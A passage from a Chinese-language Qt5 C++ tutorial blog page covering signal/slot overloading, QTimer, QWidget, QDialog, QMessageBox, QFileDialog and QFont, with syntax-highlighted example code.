class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//QT5  重载过后</span><br>     <br><span class="hljs-built_in">void</span>(Qtgirl:: * girl1)() = &amp;Qtgirl::test_signal;<br><span class="hljs-built_in">void</span>(Qtgirl:: * girl2)(QString) = &amp;Qtgirl::test_signal;<br>     <br><span class="hljs-built_in">void</span>(Qtslot:: * solt1)() = &amp;Qtslot::test_slot;<br><span class="hljs-built_in">void</span>(Qtslot:: * solt2)(QString) = &amp;Qtslot::test_slot;<br><span class="hljs-built_in">connect</span>(qtgirl, girl1, qtslot, solt1);<span class="hljs-comment">//注意函数参数的使用</span><br><span class="hljs-built_in">connect</span>(qtgirl, girl2, qtslot, solt2);<span class="hljs-comment">//注意函数参数的使用</span><br></code></pre></td></tr></table></figure><p>也就是需要我们将参数绑定在函数指针上面</p><p>返回值是void的函数指针</p></li><li><p>此外还要注意信号的使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QtWidgetsApplication1::launchSignal</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    emit qtgirl-&gt;<span class="hljs-built_in">test_signal</span>();<br>    emit qtgirl-&gt;<span class="hljs-built_in">test_signal</span>(<span class="hljs-string">&quot;Hamburger&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>lambda</code>表达式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230723222647656.png" alt="image-20230723222647656"></p></li></ol><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><h3 id="QTimer"><a href="#QTimer" class="headerlink" title="QTimer"></a>QTimer</h3><ol><li><p>构造函数</p><p>我们需要指定一个参数，让它挂在对象树上，可以进行内存回收</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230723224446185.png" alt="image-20230723224446185"></p></li><li><p>调用最好需要指定时间的间隔周期</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\QT\QT.assets\image-20230723224534289.png" alt="image-20230723224534289"></p><p>如果没有指定间隔周期，需要调用如下的操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235424678.png" alt="image-20230723235424678"></p></li><li><p>调用的开始函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235538742.png" alt="image-20230723235538742"></p></li><li><p>发送信号</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235707087.png" alt="image-20230723235707087"></p><p>当timeout时就会发出信号，我们就需要槽函数接收信号</p></li><li><p>设置精度</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235900989.png" alt="image-20230723235900989"></p></li><li><p>看定时器是否是存活的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230724000157379.png" alt="image-20230724000157379"></p></li><li><p>设置信号只发射一次</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230724000353154.png" alt="image-20230724000353154"></p></li></ol><h4 id="简单的计时器的实现"><a href="#简单的计时器的实现" class="headerlink" title="简单的计时器的实现"></a>简单的计时器的实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++">QtWidgetsApplication1::<span class="hljs-built_in">QtWidgetsApplication1</span>(QWidget *parent)<br>    : <span class="hljs-built_in">QMainWindow</span>(parent)<br>&#123;<br>    ui.<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br><br>    QTimer* qTimer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">QTimer</span>(<span class="hljs-keyword">this</span>);<br><br>    qTimer-&gt;<span class="hljs-built_in">setTimerType</span>(Qt::PreciseTimer); <br><br>    <span class="hljs-built_in">connect</span>(ui.point, &amp;QPushButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        <span class="hljs-keyword">if</span> (qTimer-&gt;<span class="hljs-built_in">isActive</span>()) &#123;<br>            qTimer-&gt;<span class="hljs-built_in">stop</span>();<br>            ui.point-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;begin&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            qTimer-&gt;<span class="hljs-built_in">start</span>(<span class="hljs-number">100</span>);<br>            ui.point-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;close&quot;</span>);<br>        &#125;<br>    &#125;);<br><br>    <span class="hljs-built_in">connect</span>(qTimer, &amp;QTimer::timeout, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QTime tm = QTime::<span class="hljs-built_in">currentTime</span>();<br>        QString curTime = tm.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&quot;hh:mm:ss.zzz&quot;</span>);<br>        ui.curTime-&gt;<span class="hljs-built_in">setText</span>(curTime);<br><br><br>    &#125;);<br>    <br><br><br>    <span class="hljs-built_in">connect</span>(ui.oncePoint, &amp;QPushButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QTimer::<span class="hljs-built_in">singleShot</span>(<span class="hljs-number">2000</span>, <span class="hljs-keyword">this</span>, [=]() &#123;<br>            QTime tm = QTime::<span class="hljs-built_in">currentTime</span>();<br>            QString curTime = tm.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&quot;hh:mm:ss.zzz&quot;</span>);<br>            ui.onceTime-&gt;<span class="hljs-built_in">setText</span>(curTime);<br>            &#125;);<br>        &#125;);<span class="hljs-comment">//实现的是一次获取时间</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="窗口类"><a href="#窗口类" class="headerlink" title="窗口类"></a>窗口类</h2><h3 id="QWidGet"><a href="#QWidGet" class="headerlink" title="QWidGet"></a>QWidGet</h3><ol><li><p>QWidGet的基本设置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//设置图标</span><br><span class="hljs-built_in">setWindowIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\OneDrive - cuit.edu.cn\\图片\\本机照片\\下载 (2).png&quot;</span>));<br>   <br><span class="hljs-comment">//设置标题</span><br><span class="hljs-built_in">setWindowTitle</span>(<span class="hljs-string">&quot;陈宏刚&quot;</span>);<br>   <br>   <br><span class="hljs-comment">//移动</span><br><span class="hljs-function">QPoint <span class="hljs-title">movePoint</span><span class="hljs-params">(<span class="hljs-number">800</span>, <span class="hljs-number">800</span>)</span></span>;<br><span class="hljs-built_in">move</span>(movePoint);<br>   <br>   <br><span class="hljs-comment">//将按钮附上text</span><br>ui.changeSize-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;改变大小&quot;</span>);<br>ui.getInfo-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;得到信息&quot;</span>);<br>ui.move-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;改变位置&quot;</span>);<br>ui.modefyBth-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;改变窗口&quot;</span>);<br>   <br>   <br><span class="hljs-comment">//当标题和图标发生变化的时候</span><br><span class="hljs-built_in">connect</span>(<span class="hljs-keyword">this</span>, &amp;QWidget::windowIconChanged, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;你的图标已经改变&quot;</span>;<br>    &#125;);<br>   <br><span class="hljs-built_in">connect</span>(<span class="hljs-keyword">this</span>, &amp;QWidget::windowTitleChanged, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;你的标题已经改变&quot;</span>;<br>    &#125;);<br>   <br></code></pre></td></tr></table></figure></li><li><p>添加右键菜单 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-comment">//添加右键菜单</span><br><span class="hljs-built_in">setContextMenuPolicy</span>(Qt::CustomContextMenu);<br><span class="hljs-built_in">connect</span>(<span class="hljs-keyword">this</span>,&amp;QWidget::customContextMenuRequested, <span class="hljs-keyword">this</span>, [=](<span class="hljs-type">const</span> QPoint&amp;pos) &#123;<br>    QMenu <span class="hljs-built_in">menu</span>(<span class="hljs-literal">nullptr</span>);<span class="hljs-comment">//右键菜单</span><br>    menu.<span class="hljs-built_in">addAction</span>(<span class="hljs-string">&quot;chg&quot;</span>);<span class="hljs-comment">//添加选项</span><br>    menu.<span class="hljs-built_in">addAction</span>(<span class="hljs-string">&quot;zjy&quot;</span>);<br>    menu.<span class="hljs-built_in">addAction</span>(<span class="hljs-string">&quot;xxp&quot;</span>);<br>    menu.<span class="hljs-built_in">exec</span>(QCursor::<span class="hljs-built_in">pos</span>());<span class="hljs-comment">//获取右键的位置，exec相当于生成函数，在此处生成 </span><br>    &#125;);<br></code></pre></td></tr></table></figure></li><li><p>模块对话框，就是有当前的焦点</p></li></ol><h3 id="QDialog"><a href="#QDialog" class="headerlink" title="QDialog"></a>QDialog</h3><ol><li><p>使用模块对话框</p><ul><li>首先得有一个dialog的类</li><li>然后再这个类里面做一些操作</li><li>然后主窗口调用这个类</li></ul><p>下面是主窗口的代码，主要是用于接受信号，创建类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qtTest::on_modalDialog_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    MyDialog myDialog;<br>   <br>   <br>    <span class="hljs-comment">//信号处理放在前面，因为不能再销毁，也就是exec之后检测</span><br>    <span class="hljs-comment">//检测是什么信号</span><br>    <span class="hljs-built_in">connect</span>(&amp;myDialog, &amp;QDialog::finished, <span class="hljs-keyword">this</span>, [=](<span class="hljs-type">int</span> ret) &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;this is finished,ret is: &quot;</span> &lt;&lt; ret;<br>        &#125;);<br>   <br>   <br>    <span class="hljs-comment">//accepted,rejected没有返回值</span><br>    <span class="hljs-built_in">connect</span>(&amp;myDialog, &amp;QDialog::accepted, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;accepted &quot;</span>;<br>        &#125;);<br>   <br>    <span class="hljs-built_in">connect</span>(&amp;myDialog, &amp;QDialog::rejected, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;this is rejected&quot;</span>;<br>        &#125;);<br>   <br>    <span class="hljs-type">int</span> ret = myDialog.<span class="hljs-built_in">exec</span>();<span class="hljs-comment">//激活窗口</span><br>   <br>    <span class="hljs-keyword">if</span> (ret == QDialog::Accepted) &#123;<span class="hljs-comment">//通过接受信号，判断是什么退出</span><br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;accepted&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret == QDialog::Rejected) &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;rejected&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;done&quot;</span>;<br>    &#125;<br>&#125;  <br></code></pre></td></tr></table></figure><p>下面是dialog的代码</p><p>三个按钮代表三个不同的退出方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyDialog::on_acceptedBtn_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">accept</span>();<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyDialog::on_rejectedBtn_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">reject</span>();<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyDialog::on_doneBtn_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">done</span>(<span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="QMessageBox（消息提示框）"><a href="#QMessageBox（消息提示框）" class="headerlink" title="QMessageBox（消息提示框）"></a>QMessageBox（消息提示框）</h4><p>给用户做交互用的</p><ol><li><p>static public function</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230729140256470.png" alt="image-20230729140256470"></p><ul><li><p><code>about</code>()</p><p>指定一个父窗口，指定一个标题，指定信息</p></li><li><p>aboutQt()</p><p>显示现在qt的信息</p></li></ul></li></ol><h4 id="QFileDialog-用于打开文件列表"><a href="#QFileDialog-用于打开文件列表" class="headerlink" title="QFileDialog(用于打开文件列表)"></a>QFileDialog(用于打开文件列表)</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230730083655196.png" alt="image-20230730083655196"></p><ol><li><p>常用的静态函数的用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAVAFILE</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qtTest::on_modefyBth_2_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> OPENDIR</span><br>    QString dir = QFileDialog::<span class="hljs-built_in">getExistingDirectory</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;目录&quot;</span>,<br>        <span class="hljs-string">&quot;D:\\code\\vs\\vs2019_qt\\qtTest\\qtTest&quot;</span>);<br>    <span class="hljs-comment">//qDebug() &lt;&lt; &quot;your choose is:&quot; &lt;&lt; dir;</span><br>    QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;open file&quot;</span>,dir);<br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// OPENDIR</span></span><br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> OPENFILE</span><br>    QString dir = <span class="hljs-string">&quot;Text files (*txt)&quot;</span>;<br>    QString fileName = QFileDialog::<span class="hljs-built_in">getOpenFileName</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;openfile&quot;</span>,<br>        <span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\data.txt&quot;</span>,<br>        <span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;Images (*.png,*jpg);;Text files (*txt)&quot;</span>),&amp;dir);<br>    QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;open file&quot;</span>, <span class="hljs-string">&quot;你打开的文件是：&quot;</span> + fileName);<br>   <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// OPENFILE</span></span><br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> OPENFILES</span><br>    QString dir = <span class="hljs-string">&quot;Text files (*txt)&quot;</span>;<br>    QStringList fileNames = QFileDialog::<span class="hljs-built_in">getOpenFileNames</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;打开文件&quot;</span>,<br>        <span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\data.txt&quot;</span>,<br>        <span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;Images (*.png,*jpg);;Text files (*txt)&quot;</span>),&amp;dir);<br>    QString name;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : fileNames) &#123;<br>        name += item+<span class="hljs-string">&quot;   &quot;</span>;<br>    &#125;<br>    QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;你打开的文件&quot;</span>, name);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// OPENFILES</span></span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SAVAFILE</span><br>    QString dir = <span class="hljs-string">&quot;Text files (*txt)&quot;</span>;<br>    QString fileName = QFileDialog::<span class="hljs-built_in">getSaveFileName</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;保存文件&quot;</span>,<br>        <span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\data.txt&quot;</span>,<br>        <span class="hljs-built_in">tr</span>(<span class="hljs-string">&quot;Images (*.png,*jpg);;Text files (*txt)&quot;</span>), &amp;dir);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// SAVAFILE</span></span><br>   <br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="QFontDialog（字体对话框类）"><a href="#QFontDialog（字体对话框类）" class="headerlink" title="QFontDialog（字体对话框类）"></a>QFontDialog（字体对话框类）</h4><h5 id="QFont-字体类"><a href="#QFont-字体类" class="headerlink" title="QFont(字体类)"></a>QFont(字体类)</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br>  QFont::<span class="hljs-built_in">QFont</span>();<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  参数:</span><br><span class="hljs-comment">    - family: 本地字库中的字体名, 通过 office 等文件软件可以查看</span><br><span class="hljs-comment">    - pointSize: 字体的字号</span><br><span class="hljs-comment">    - weight: 字体的粗细, 有效范围为 0 ~ 99</span><br><span class="hljs-comment">    - italic: 字体是否倾斜显示, 默认不倾斜</span><br><span class="hljs-comment">  */</span><br>  QFont::<span class="hljs-built_in">QFont</span>(<span class="hljs-type">const</span> QString &amp;family, <span class="hljs-type">int</span> pointSize = <span class="hljs-number">-1</span>, <span class="hljs-type">int</span> weight = <span class="hljs-number">-1</span>, <span class="hljs-type">bool</span> italic = <span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-comment">// 设置字体</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setFamily</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;family)</span></span>;<br>  <span class="hljs-comment">// 根据字号设置字体大小</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setPointSize</span><span class="hljs-params">(<span class="hljs-type">int</span> pointSize)</span></span>;<br>  <span class="hljs-comment">// 根据像素设置字体大小</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setPixelSize</span><span class="hljs-params">(<span class="hljs-type">int</span> pixelSize)</span></span>;<br>  <span class="hljs-comment">// 设置字体的粗细程度, 有效范围: 0 ~ 99</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setWeight</span><span class="hljs-params">(<span class="hljs-type">int</span> weight)</span></span>;<br>  <span class="hljs-comment">// 设置字体是否加粗显示</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setBold</span><span class="hljs-params">(<span class="hljs-type">bool</span> enable)</span></span>;<br>  <span class="hljs-comment">// 设置字体是否要倾斜显示</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QFont::setItalic</span><span class="hljs-params">(<span class="hljs-type">bool</span> enable)</span></span>;<br>  <br>  <span class="hljs-comment">// 获取字体相关属性(一般规律: 去掉设置函数的 set 就是获取相关属性对应的函数名)</span><br>  <span class="hljs-function">QString <span class="hljs-title">QFont::family</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QFont::italic</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QFont::pixelSize</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QFont::pointSize</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QFont::bold</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QFont::weight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br></code></pre></td></tr></table></figure><ol><li><p>给一个窗口设置字体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">ui.changeFontLabel-&gt;<span class="hljs-built_in">setFont</span>(ft);<br></code></pre></td></tr></table></figure></li><li><p>使用QAppication给所有的窗口设置字体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">QApplication::<span class="hljs-built_in">setFont</span>(ft);<br></code></pre></td></tr></table></figure></li><li><p>下面是使用的方法</p><p>在一个槽函数里面调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qtTest::on_chengeFont_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> ok;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    QFont ft = QFontDialog::<span class="hljs-built_in">getFont</span>(&amp;ok, <span class="hljs-built_in">QFont</span>(<span class="hljs-string">&quot;微软雅黑&quot;</span>,<span class="hljs-number">12</span>, QFont::Bold),<br>        <span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;选择字体&quot;</span>);<br>    <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;ok value is &quot;</span> &lt;&lt; ok;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    QFont ft = QFontDialog::<span class="hljs-built_in">getFont</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// 1</span></span><br>   <br>    ui.changeFontLabel-&gt;<span class="hljs-built_in">setFont</span>(ft);<br>    QApplication::<span class="hljs-built_in">setFont</span>(ft);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="QColorDialog"><a href="#QColorDialog" class="headerlink" title="QColorDialog"></a>QColorDialog</h4><h5 id="QColor颜色类"><a href="#QColor颜色类" class="headerlink" title="QColor颜色类"></a>QColor颜色类</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br>QColor::<span class="hljs-built_in">QColor</span>(Qt::GlobalColor color);<br>QColor::<span class="hljs-built_in">QColor</span>(<span class="hljs-type">int</span> r, <span class="hljs-type">int</span> g, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> a = ...);<br>QColor::<span class="hljs-built_in">QColor</span>();<br><br><span class="hljs-comment">// 参数设置 red, green, blue, alpha, 取值范围都是 0-255</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setRed</span><span class="hljs-params">(<span class="hljs-type">int</span> red)</span></span>;<span class="hljs-comment">// 红色</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setGreen</span><span class="hljs-params">(<span class="hljs-type">int</span> 